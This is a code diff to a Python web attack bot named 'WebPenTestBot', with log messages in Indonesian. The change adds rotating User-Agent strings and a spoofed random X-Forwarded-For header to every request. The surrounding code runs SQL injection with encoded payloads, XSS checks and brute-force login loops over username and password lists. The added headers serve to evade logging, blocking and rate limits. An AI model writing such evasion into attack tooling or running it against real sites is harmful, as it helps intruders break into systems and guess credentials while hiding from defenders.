@@ -45,12 +45,29 @@ class WebPenTestBot:
         encoded_payload = base64.b64encode(payload.encode()).decode()
         return encoded_payload
 
+    def random_user_agent(self):
+        user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+        ]
+        return random.choice(user_agents)
+
+    def generate_random_headers(self):
+        headers = {
+            "User-Agent": self.random_user_agent(),
+            "X-Forwarded-For": f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}",  # Randomize IP address
+            "X-Requested-With": "XMLHttpRequest",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+        }
+        return headers
+
     async def get_html(self, path, retries=3, timeout=5):
         url = self.base_url + path
         attempt = 0
         while attempt < retries:
             try:
-                async with self.session.get(url, timeout=timeout) as response:
+                async with self.session.get(url, timeout=timeout, headers=self.generate_random_headers()) as response:
                     response.raise_for_status()
                     return await response.text()
             except (aiohttp.ClientError, asyncio.TimeoutError) as e:
@@ -65,7 +82,7 @@ class WebPenTestBot:
         url = self.base_url + path
         data = {"username": encoded_payload, "password": encoded_payload}
         
-        async with self.session.post(url, data=data) as response:
+        async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
             if 'error' in await response.text():
                 self.log(f"{Colors.YELLOW}[!] Eksploitasi SQL Injection berhasil menyebabkan error pada: {url}{Colors.RESET}")
             elif 'Welcome' in await response.text():
@@ -78,7 +95,7 @@ class WebPenTestBot:
         url = self.base_url + path
         data = {'input': payload}
         
-        async with self.session.post(url, data=data) as response:
+        async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
             if payload in await response.text():
                 self.log(f"{Colors.GREEN}[!] Cross-Site Scripting (XSS) berhasil pada: {url}{Colors.RESET}")
             else:
@@ -106,7 +123,7 @@ class WebPenTestBot:
         for username in usernames:
             for password in passwords:
                 data = {'username': username, 'password': password}
-                async with self.session.post(url, data=data) as response:
+                async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
                     if 'Welcome' in await response.text():
                         self.log(f"{Colors.GREEN}[+] Brute Force berhasil login dengan username: {username} dan password: {password}{Colors.RESET}")
                         return
@@ -129,7 +146,7 @@ class WebPenTestBot:
         if self.login_url and self.credentials:
             login_page = await self.get_html(self.login_url)
             if login_page:
-                async with self.session.post(self.base_url + self.login_url, data=self.credentials) as response:
+                async with self.session.post(self.base_url + self.login_url, data=self.credentials, headers=self.generate_random_headers()) as response:
                     if 'Welcome' in await response.text():
                         self.log(f"{Colors.GREEN}[+] Login berhasil!{Colors.RESET}")
                     else:
